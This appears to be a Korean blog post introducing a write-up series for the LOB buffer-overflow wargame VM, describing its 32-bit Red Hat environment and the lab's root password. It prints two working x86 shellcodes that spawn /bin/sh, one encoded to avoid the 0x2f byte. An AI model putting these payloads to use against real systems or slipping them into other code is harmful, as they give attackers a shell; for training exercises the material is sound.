---
layout: single
title: "LOB Intro"
#description: ""
date: 2016-02-05 12:00:00 -0400
# modified: 
tags: 
- wargame
- writeup
- pwnable
comments: true
share: true
---

BOF의 OS의 종류와 버전은 LOB의 VM을 통해 Red Hat Linux 6.2라는 것을 알 수 있으며 리눅스 환경이므로 ELF 파일구조를 사용함과 어셈블리어가 at&t 문법임을 유추해 낼 수 있다. 그리고 아래와 같이 i686 아키텍처이므로 32bit 메모리를 사용함을 알 수 있다.

![arch]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-Intro/0.png)


LOB 풀이에 사용한 쉘코드는 다음과 같다.

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```

25bytes shellcode(execve(“/bin/sh”) 사용)

```
\xd9\xc5\xd9\x74\x24\xf4\xb8\x15\xc3\x69\xd7\x5d\x29\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\xe0\xa9\x62\x8f\x93\x7c\x13\x47\x8e\xe3\x52\x70\xb8\xcc\x17\x17\x38\x7b\xf7\x85\x51\x15\x8e\xa9\xf3\x01\x98\x2d\xf3\xd1\xb6\x4f\x9a\xbf\xe7\xfc\x34\x40\xaf\x51\x4d\xa1\x82\xd6
```

/x2f가 없는 shellcode


그리고 LOB의 default shell(bash)의 버전이 낮아 /xff의 입력을 /x00으로 받아들이는 오류가 있으므로 bash2를 사용하도록 한다. root 권한으로 이를 한꺼번에 바꾸도록 한다. root의 패스워드는 hackerschoolbof이다. root로 로그인 후 /etc/passwd를 열어 bash를 bash2로 모두 치환해준다.

![bash2]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-Intro/1.png)


다음은 C언어의 stack frame structure이다.


![[memory map of a typical C ELF executable on x86]]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-Intro/2.png)